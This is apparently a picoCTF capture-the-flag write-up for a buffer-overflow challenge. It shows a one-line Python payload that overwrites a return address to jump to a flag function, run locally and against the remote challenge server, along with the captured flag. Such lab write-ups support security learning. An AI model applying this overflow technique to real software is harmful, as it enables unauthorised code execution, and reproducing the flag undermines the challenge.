## Objetivo
Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/185/vuln).You can view source [here](https://artifacts.picoctf.net/c/185/vuln.c). And connect with it using `nc saturn.picoctf.net 52941`

Hints
- Make sure you consider big Endian vs small Endian.
- Changing the address of the return pointer can call different functions.

## Solucion

```bash
┌──(wil㉿DESKTOP-FKOIV4I)-[~/picoCTF/binexp/parte-2/bufferoverflow2]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')" | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTf{dummie_flag}
Segmentation fault (core dumped)

┌──(wil㉿DESKTOP-FKOIV4I)-[~/picoCTF/binexp/parte-2/bufferoverflow2]
└─$ (python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')";echo) | nc saturn.picoctf.net 64314
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
```
## Notas adicionales
## Referencias
